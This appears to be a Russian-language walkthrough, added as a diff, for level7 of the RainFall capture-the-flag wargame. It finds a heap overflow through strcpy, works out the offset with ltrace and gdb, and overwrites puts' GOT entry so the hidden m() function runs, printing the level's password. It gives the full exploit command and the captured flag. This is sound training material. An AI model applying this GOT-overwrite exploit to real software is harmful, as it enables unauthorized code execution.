@@ -1,0 +1,65 @@
+Мы можем найти исполняемый файл, который выполняет сегментацию без параметра, и напечатать "~~" с 2 параметрами.
+
+После анализа с помощью gdb мы можем увидеть функцию main() и не вызываемую функцию m().
+
+Давайте поговорим о main():
+
+Существует 2 malloc(8) для каждого argv[1] && argv[2].
+Он использует strcpy() для копирования строк в av[0] и av[1] в соответствующую выделенную память. strcpy() не защищен и будет копироваться до тех пор, пока не достигнет конца строки.
+Мы видим, что программа извлекает флаг с помощью fgets() и сохраняет его в глобальной переменной c, но ничего с ним не делает.
+Во время первого вызова strcpy() мы можем перезаписать адрес, используемый в качестве места назначения для второго strcpy() (b[1]) => мы хотим перезаписать функцию puts(), GOT адрес для вызова функции m() вместо этого.
+
+1) Давайте получим смещение, необходимое для перезаписи b[1], используя ltrace для печати вызовов libc.
+
+#level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+#__libc_start_main(0x8048521, 2, 0xbffff784, 0x8048610, 0x8048680 <unfinished ...>
+#malloc(8)                                                       = 0x0804a008
+#malloc(8)                                                       = 0x0804a018
+#malloc(8)                                                       = 0x0804a028
+#malloc(8)                                                       = 0x0804a038
+#strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)       = 0x0804a018
+#strcpy(0x37614136, NULL <unfinished ...>
+#--- SIGSEGV (Segmentation fault) ---
+#+++ killed by SIGSEGV +++
+#level7@RainFall:~$
+
+Благодаря генератору шаблонов мы обнаружили, что смещение начинается с 20.
+2) Нам нужно найти запись puts() GOT (указатель для перезаписи) :
+
+#level7@RainFall:~$ gdb level7
+#(gdb) info function puts
+#All functions matching regular expression "puts":
+#
+#Non-debugging symbols:
+#0x08048400  puts
+#0x08048400  puts@plt
+#(gdb) disass 0x08048400
+#Dump of assembler code for function puts@plt:
+#   0x08048400 <+0>:     jmp    *0x8049928         <----- Found it !!
+#   0x08048406 <+6>:     push   $0x28
+#   0x0804840b <+11>:    jmp    0x80483a0
+#End of assembler dump.
+#(gdb)
+
+3) Мы можем проверить перезапись на b[1] с помощью ltrace, чтобы быть уверенными
+
+#level7@RainFall:~$ ltrace ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') bla
+#__libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
+#malloc(8)                                                       = 0x0804a008
+#malloc(8)                                                       = 0x0804a018
+#malloc(8)                                                       = 0x0804a028
+#malloc(8)                                                       = 0x0804a038
+#strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAA(\231\004\b")           = 0x0804a018
+#strcpy(0x08049928, "bla")                                       = 0x08049928
+#fopen("/home/user/level8/.pass", "r")                           = 0
+#fgets( <unfinished ...>
+#--- SIGSEGV (Segmentation fault) ---
+#+++ killed by SIGSEGV +++
+#level7@RainFall:~$
+
+Aдрес m() легко найти в gdb (информационная функция m): 0x080484f4 4. Теперь мы можем перезаписать b[1], чтобы вызвать m()
+
+level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1606130489
+level7@RainFall:~$ su level8
